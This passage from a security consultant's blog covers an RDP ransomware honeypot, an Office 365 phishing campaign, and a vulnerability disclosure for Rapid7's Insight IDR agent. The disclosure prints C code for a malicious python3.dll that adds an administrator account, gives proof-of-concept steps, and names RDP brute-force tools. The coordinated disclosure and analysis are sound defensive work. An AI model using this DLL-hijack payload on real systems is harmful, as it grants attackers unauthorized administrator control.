Mit [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) protokollieren wir alle Prozessstarts, Datei- und Registryänderungen aber auch jeglichen Netzwerkverkehr. Der [Blackcat Keylogger](https://0x00sec.org/t/blackcat-keylogger/10307) zeichnet zusätzliche alle Tastatureingaben auf. Da viele Cyberangriffe auf Powershell aufbauen, [werden diese Befehle auch geloggt](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html). Damit wir sofort bescheid wissen, sobald unser Honeypot attackiert wird, haben wir unser Microsoft Teams integriert, wodurch [Live Notifications](https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using#setting-up-a-custom-incoming-webhook) möglich werden. Um das Vorgehen der Kriminellen besser zu verstehen, haben wir an unterschiedlichen Stellen im Dateisystem auch Fake Inhalte platziert. Alle Aktivitäten der RDP Sitzung werden mit [FFmpeg](https://www.ffmpeg.org/) auch als Video aufgezeichnet. Und genau darum geht es in diesem Blogeintrag!

Im Folgenden finden Sie ein Video, das die Verschlüsselung unseres Honeypots und das Vorgehen der Kriminellen im Detail zeigt. Besonders spannend daran ist jedoch, dass zuvor der komplette Rechner analysiert und auch Lateral Movement versucht wird. Also gleich ansehen:

Bei der vom Angreifer verwendeten Cryptolocker Schadsoftware handelt es sich übrigens um Standardkomponenten: CrySIS. Diese wird sehr oft in der von uns beobachteten Form per RDP Bruteforcing in Unternehmensnetzwerke eingeschleust. Siehe dazu auch das wirklich gelungene [Threat Spotlight von Malwarebytes](https://blog.malwarebytes.com/threat-analysis/2019/05/threat-spotlight-crysis-aka-dharma-ransomware-causing-a-crisis-for-businesses/).

Das hier eingesetzte Sample war übrigens schon von praktisch allen Virenscannern als bösartig eingestuft. Da die Infektionen aber manuell stattfindet, werden die installierten Virenscanner einfach deaktiviert.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-02-13-at-13.17.44.png)

In unserem Fall wäre ein Zahlung von 3.000€ von den Angreifern gefordert worden. Leider kann man sich jedoch oft nicht auf die Aussagen der Kriminellen verlassen. Wird die initiale Forderung beglichen, kann es passieren, dass das Lösegeld noch einmal erhöht wird:

![](https://bogner.sh/wp-content/uploads/2020/04/Untitled.png)
## Wie bricht man in RDP Server ein?

Um überhaupt in unseren Honeypot einzubrechen, kann beispielsweise Masscan und RDP Brute verwendet werden. Im ersten Schritt werden dabei mittels der in [Masscan](http://toolshacke.blogspot.com/2016/12/masscan-gui-windows.html) hinterlegten Länder IP Ranges öffentlich erreichbare RDP Server gesucht. Der eigentliche Einbruchsversuch kann anschließend mit [RDP Brute](https://hack-nesia.blogspot.com/2016/07/rdp-brute-coded-by-z668.html) oder NL Brute durchgeführt werden. Beide Tools ermöglichen Wörterbuchangriffe auf schwache Benutzerpasswörter:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.02.05.png)

Viele der so gekaperten Rechner werden nicht nur verschlüsselt, sondern auch auf Plattformen wie dedic.top für wenig Geld weiterverkauft. Als Käufer kann man hier komfortabel auf den Serverstandort, Admin Rechte und “Entdeckungsrisiko” filtern. Sollte der so gekaufte “Dedic” vom eigentlichen Besitzer gesperrt worden sein, gibt es natürlich kostenlos Ersatz.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.18.55.png)
## Wie kann ich mich schützen?

IT Security muss nicht immer teuer sein! Ganz im Gegenteil, ein guter Basisschutz reicht in vielen Fällen bereits aus, um Cyberangriffe zu verhindern – so auch hier.

### **RDP nicht direkt im Internet publizieren & Multi-Faktor Authentifizierung**

Es sollte immer ein Remote Desktop Gateway verwendet werden, der zusätzliche Sicherheitsfunktionen bereitstellt. Besonders wichtig ist hier der zweite Authentifizierungsfaktor z.B. per Smartphone-App für Remotezugriffe.

### **Verwenden Sie Lockout Policies**

Unser Honeypot wird primär durch Wörterbuchangriffe übernommen. Leider mussten wir auch bereits einige echte Incidents nach Einbrüchen über RDP bearbeiten. Durch die Nutzung einer Lockout Policy hätten viele verhindert werden können.

### **Mitarbeiter Awareness**

Alleine durch Technik ist es nicht möglich die eigene Organisation ausreichend zu schützen! Entscheidend ist die Mitarbeiter auf die Bedrohungen durch Cyberkriminalität zu schulen. Wir können hier unseren Partner [nextbeststep](https://www.nextbeststep.at/) nur wärmstens empfehlen!

### **IT Systeme härten** (“Hacking Workshops”)

Es gibt noch viele weitere einfache Tricks, wie das eigene Netzwerk noch besser gegen Angriffe abgesichert werden kann. Dies lassen sich am Besten im Zuge von “Hacking Workshops” vermitteln. In unseren geführten Security Audits hacken wir gemeinsam mit Ihrer IT Abteilung die eigene Infrastruktur und erarbeiten anschließend gemeinsam entsprechende Absicherungsmaßnahmen. Dieses Vorgehen bringt einen langfristigen IT Security Mehrwert in der IT Abteilung und hilft sofort wichtige Absicherungsmaßnahmen umzusetzen. Das besondere: Wir helfen gleich bei der Implementierung mit – das ganze ohne eigenes Produkt-Portfolio.

Bei Fragen zu diesem Artikel oder unseren Hacking Workshops, senden Sie mir am Besten eine Mail an: florian [@] bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 00:30

## [Phishing auf der Schulter von Riesen](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/ "Phishing auf der Schulter von Riesen")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/#respond)

Jan 082020

Aktuell gibt es im deutschsprachigen Raum eine neue Phishing Welle, die es vor allem auf Office 365 Konten absieht. Das besondere daran: die Office 365 Infrastruktur ist selbst Teil der Attacke.

Leider erscheint die neue Taktik aber auch sehr gut zu funktionieren. Wir haben mittlerweile mehrere Kunden die mit entsprechend kompromittierten Konten konfrontiert sind. Über das Microsoft 365 Admin Center und den [Audit Log Search](https://protection.office.com/unifiedauditlog) ist es im Fall der Fälle aber relativ gut möglich die Größe der Infektion zu erkennen und entsprechende Gegenmaßnahmen (Passwort Resets; Meldung bei DSB) einzuleiten.

Aber zurück zur eigentlichen Attacke. Im Folgenden werden wir ein anonymisiertes Beispiel verwenden, um die verschiedenen Teilschritte zu analysieren.

## Das Phishing Mail

Als Eintrittspunkt in die Organisation werden meist legitim aussehende Phishing Mails, wie das Folgende eingesetzt. Das gemeine daran: Beim Absender handelt es sich um ein echte Firma, der richtigen Firmendomäne und der passenden Signatur. Nur der Inhalt der Nachricht könnte zum Nachdenken anregen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.13.57.png)
## Die Landing Page

Aber hier kommt schon der nächste Trick der Angreifer: der eingebettete Link zeigt auf einen bereits vorab gekaperten Account auf Office 365. In diesem Fall auf eine OneNote Notiz. Dies erschwert es einerseits den technischen Schutzmaßnahmen, da die Microsoft Domänen ein hohes Vertrauen genießen. Andererseits kennen auch die Anwender Microsoft als “sicheres” Unternehmen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.17.47.png)

Neben OneNote werden aber auch noch andere Produkte, wie beispielsweise Sway von den Angreifern eingesetzt:

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.42.17.png)

Das heißt, die Kriminellen missbrauchen das komplette Office 365 Portfolio. Das Schema ist aber immer das gleiche: das potentielle Opfer soll einem Link auf eine Drittseite folgen.

*Besonders perfide: Kann der eigene Account gekapert werden, wird auch dieser in Phishing Angriffen eingesetzt!*

## Die eigentliche Phishing Seite

Klickt der Endanwender tatsächlich auf den Link, landet er/sie auf der eigentlichen Phishing Seite. Hier sind die Angreifer nicht wählerisch und bieten viele verschiedene “Anmeldeverfahren” an. Der Benutzer kann selbst auswählen welche Zugangsdaten er/sie preisgeben möchte.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.07.png)

Wird beispielsweise Office 365 selektiert, erscheint eine der echten Microsoft Loginseite nachempfundene Anmeldemaske.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.12.png)
## Das Finale

Gibt der Anwender seine Daten ein, wird eine x-beliebige PDF Datei angezeigt. Dieses Vorgehen deckt sich mit unseren Red-Teaming / Friendly Phishing Erfahrungen: es ist wichtig dem Benutzer Feedback zu geben. Selbst wenn es sich dabei um sinnlose Informationen handelt, reicht dies aus, damit die IT Abteilung NICHT über einen möglichen Fehler informiert wird. Die Attacke bleibt dadurch unentdeckt.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.52.15.png)
## Die Analyse

Da leider bereits einige unserer Kunden Opfer der hier beschriebenen Attacke wurden, konnten wir das Vorgehen mehrfach analysieren. Das folgenden Bild illustriert die wichtigsten Abläufe (natürlich anonymisiert):

![](https://bogner.sh/wp-content/uploads/2020/01/IMG_1531.jpg)

Bei allen gekaperten Mailboxen konnten wir nach der initialen Kompromittierung mehrere unautorisierte Zugriffe durch die Angreifer feststellen. U.a. wird dabei auch das IMAP Protokoll eingesetzt. Es ist also davon auszugehen, dass Daten exfiltiert wurden.

Nach Tagen, teilweise sogar Wochen, wird dann das eigene Konto verwendet um selbst Spam Nachrichten an alle Kontakte zu versenden. Dabei wird die versendete Phishing Nachricht auch an den jeweiligen Absender angepasst. Beispielsweise wird die Signatur übernommen und auch der Firmenname in den Phishing Seiten eingebaut. Damit der gerade stattfindenden Spam Versand nicht durch Fehlermeldungen vom Benutzer entlarvt werden kann, werden u.a. Outlook Regeln eingesetzt, die eingehende Nachrichten automatisiert löschen.

All diese Maßnahmen machen die Fake-Mails viel erfolgreicher und erschweren die Erkennung erheblich. Phishing auf den Schultern von Riesen!

Sollten Sie selbst Opfer einer Cyber Attacke geworden sein, stehen wir mit unserem Know How hilfreich zur Seite.

Egal ob Phishing, Cryptolocker oder Datendiebstahl. Wir können helfen: [Bee IT Security](https://www.bee-itsecurity.at)!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

 Posted by [florian](https://bogner.sh/author/florian/) at 17:25

## [Local Privilege Escalation in Rapid7’s Windows Insight IDR Agent](https://bogner.sh/2019/06/local-privilege-escalation-in-rapid7s-windows-insight-idr-agent/ "Local Privilege Escalation in Rapid7’s Windows Insight IDR Agent")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2019/06/local-privilege-escalation-in-rapid7s-windows-insight-idr-agent/#respond)

Jun 032019

With [Insight IDR](https://www.rapid7.com/products/insightidr/) Rapid7 has created a very powerful, yet still easy to use Incident Detection and Response toolkit. During one of my latest assignments I found its Windows agent installed on my client’s systems.

While trying to disable it so that I can stay under the radar, I discovered a privilege escalation vulnerability in its Windows service. This vulnerability could be abused by any local user to gain full control over the affected system. It has been verified on a fully patched German Windows 10 x64 running Insight Agent v2.6.3.14. **The issue has been fixed with version 2.6.5.**

*PS: Did I mention that I run my own company? It’s called [Bee IT Security](https://www.bee-itsecurity.at)[German only], just in case you need world class penetration testing or security consulting services.

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)*

The underlying issue is that the ir\_agent Windows Service, which is automatically started on system boot and runs with SYSTEM privileges, tries to load the DLL C:\DLLs\python3.dll

![](https://bogner.sh/wp-content/uploads/2019/05/2a.png)

Although this path does not exist by default, it can be created by any local user. This is possible because the filesystem ACLs of the system drive allow anyone to create [new subfolders](https://msdn.microsoft.com/en-us/library/windows/desktop/gg258116%28v%3Dvs.85%29.aspx?f=255&MSPPError=-2147217396).

![](https://bogner.sh/wp-content/uploads/2019/05/3.png)

With that knowledge, I created a new DLL that mimics the expected exports of the real python3.dll. However, instead of providing any of the expected functionality, it simply adds a new administrative user “attacker” to the system. You can download the full source [here](https://bogner.sh/wp-content/uploads/2019/05/DLL.zip).

```

/*
Implement DLLMain with common datatypes so we don't have to include windows.h.
Otherwise this would cause several compile errors because of the already known but reexported functions.
*/
int DllMain(void* hinst, unsigned long* reason, void* reserved) {
	system("cmd /c \"date &amp;gt;&amp;gt; C:\\this_should_not_work.txt\"");
	system("net user attacker Batman42 /add");
	system("net localgroup Administrators attacker /add");
	system("net localgroup Administratoren attacker /add");
	exit(1);
	return 0;
}
...

```

After compiling it into a DLL I saved it (logically with a standard User account) as C:\DLLs\python3.dll.

![](https://bogner.sh/wp-content/uploads/2019/05/4.png)

After a reboot the DLL was loaded by the privileged Windows service ir\_agent and the user attacker was created.

![](https://bogner.sh/wp-content/uploads/2019/05/5-1.png)
# Proof of Concept

To confirm this issue yourself install the Insight IDR Windows Agent v2.6.3.14 (The issue has been fixed with version 2.6.5) and download the precompiled version of the [malicious exploit DLL](https://bogner.sh/wp-content/uploads/2019/05/DLL.zip).

After that, as a non-admin user, create the folder C:\DLLs and place the library python3.dll therein. Now simply reboot the system. After that the new admin user attacker will be added. This proofs that full SYSTEM level access has been gained.

# Suggested solution

All external dependencies should only be loaded from secure locations.

# Timeline

* 22.5.2019: The issue has been identified, documented and reported
* 22.5.2019: The vulnerability has been confirmed by Rapid7
* 29.5.2019: Rapid7 released a new version (2.6.5) of the Insight agent that fixes this vulnerability. CVE-2019-5629 has been assigned.

 Posted by [florian](https://bogner.sh/author/florian/) at 05:24

[Older Entries](https://bogner.sh/page/2/)

### Search

### Pages

* [About Me](https://bogner.sh/about-me/)
  + [Curriculum Vitae](https://bogner.sh/wp-content/uploads/2017/11/Florian-Bogner-CV-20171126-NP.pdf#new_tab)
  + [LinkedIn Profile](https://www.linkedin.com/profile/view?id=368904276#new_tab)
  + [XING Profile](https://www.xing.com/profile/Florian_Bogner9#new_tab)
* [Donate](https://bogner.sh/donate1/)
* [Privacy Policy](https://bogner.sh/privacy-policy/)
* [Projects](https://bogner.sh/projects/)
* [References](https://bogner.sh/references/)
### Categories

* [Hardware](https://bogner.sh/category/hardware/) (4)
* [Linux](https://bogner.sh/category/linux/) (10)
* [Mac OS X](https://bogner.sh/category/mac-os-x/) (41)
* [Network](https://bogner.sh/category/network/) (6)
* [Security](https://bogner.sh/category/security/) (39)
* [Software](https://bogner.sh/category/software/) (34)
* [Tipps](https://bogner.sh/category/tipps/) (60)
* [Tools](https://bogner.sh/category/tools/) (21)
* [UAC Technikum Vienna](https://bogner.sh/category/uac-technikum-vienna/) (2)
* [Uncategorized](https://bogner.sh/category/uncategorized/) (18)
* [Web Security](https://bogner.sh/category/web-security/) (2)
* [Windows](https://bogner.sh/category/windows/) (27)

### Recent Posts

* [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/)
* [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/)
* [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)
* [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/)
* [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/)
### Meta

* [Log in](https://bogner.sh/wp-login.php)
* [Entries feed](https://bogner.sh/feed/)
* [Comments feed](https://bogner.sh/comments/feed/)
* [WordPress.org](https://wordpress.org/)

| © 2012 [bogner.sh](http://bogner.sh) |  | [Suffusion theme by Sayontan Sinha](http://aquoid.com/news/themes/suffusion/) |
| --- | --- | --- |


